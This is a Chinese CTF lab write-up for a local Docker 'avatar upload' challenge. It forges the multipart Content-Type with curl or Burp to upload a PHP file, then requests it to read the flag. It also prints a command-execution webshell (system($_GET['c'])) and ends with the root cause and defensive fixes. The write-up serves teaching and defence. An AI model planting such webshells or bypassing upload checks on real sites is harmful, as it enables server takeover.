# 题解：头像上传（文件上传 · Content-Type 绕过）

> 对应课件 p36「一个往里传，一个往外跳」（上传那一半）。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | 文件上传、`Content-Type` 可伪造、上传目录可访问 |
| 难度 | 2 |
| 端口 | 8091 |
| Flag 格式 | `flag{...}` |

一句话：服务端只用 `Content-Type` 判断「是不是图片」，而这个值**是客户端自己填的**。

> 在这儿传 `.php`，确实 **AI 做不到这么抽象**；不过真敢这么干，**你的胆子真是肥嘟嘟的啊**。

## 二、启动环境

> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。

```bash
cd upload-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8091/
```

## 三、手把手解题

### Step 1｜先正常传一张图

随便找个 png 传上去，页面提示：

```
上传成功：uploads/xxx.png
访问：uploads/xxx.png
```

——**上传目录能直接访问**，这是后面 getshell 的前提。

### Step 2｜直接传 .php，会被挡

本地建一个 `shell.php`：

```php
<?php require __DIR__ . '/../flag.inc.php'; echo ctf_flag(); ?>
```

浏览器上传它，被拒绝：

> 只允许上传图片（Content-Type 必须是 image/*），你上传的是：application/x-php

注意这行提示 —— **它把判断依据直接告诉你了**：看的是 `Content-Type`。

### Step 3｜伪造 Content-Type 再传（curl 一行搞定）

```bash
curl.exe -F "f=@shell.php;type=image/png" http://127.0.0.1:8091/
```

`;type=image/png` 就是在 multipart 里把这一段的 `Content-Type` 写死成图片。

页面返回：

```
上传成功：uploads/shell.php
```

### Step 4｜伪造 Content-Type（Burp 方式）

1. 浏览器上传 `shell.php`，Burp 拦下
2. 找到这一段：

```
Content-Disposition: form-data; name="f"; filename="shell.php"
Content-Type: application/x-php        ← 改成 image/png
```

3. 放行 → 上传成功

### Step 5｜访问木马，拿 flag

```bash
curl http://127.0.0.1:8091/uploads/shell.php
```

直接回显 `flag{...}`。

> 想要更好用的马：
> ```php
> <?php system($_GET['c']); ?>
> ```
> 然后 `?c=whoami` 就能执行命令（容器里是 `www-data`）。

## 四、为什么能成（原理）

```php
$type = $_FILES['f']['type'];      // ← 这个值就是客户端在 multipart 里写的
if (strpos($type, 'image/') !== 0) { die('只允许上传图片'); }
move_uploaded_file($tmp, __DIR__ . '/uploads/' . $name);
```

`$_FILES['f']['type']` **完全由客户端决定**，改一个字就能绕。真正的判断应该看**文件内容**：

```php
$info = getimagesize($tmp_path);   // 解析文件头，判断是不是真图片
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $tmp_path);
```

本题同时踩了两个坑：**只校验客户端数据** + **上传目录可直接访问且能执行 PHP**。

## 五、怎么修（防御）

1. **按内容校验**：`finfo_file()` / `getimagesize()`，别信 `Content-Type`
2. **重命名**：`$new = bin2hex(random_bytes(8)) . '.png'`，丢掉用户给的文件名
3. **上传目录禁止执行**：
   ```nginx
   location /uploads/ { location ~ \.php$ { deny all; } }
   ```
4. 上传目录**移出 Web 根**，或挂到对象存储
5. 白名单后缀（不是黑名单）

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`；未注入则自动随机生成并缓存到 `/tmp/.web_ctf_flag`。
木马通过 `require` 复用同一个读取器，所以拿到的是当前实例的 flag。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
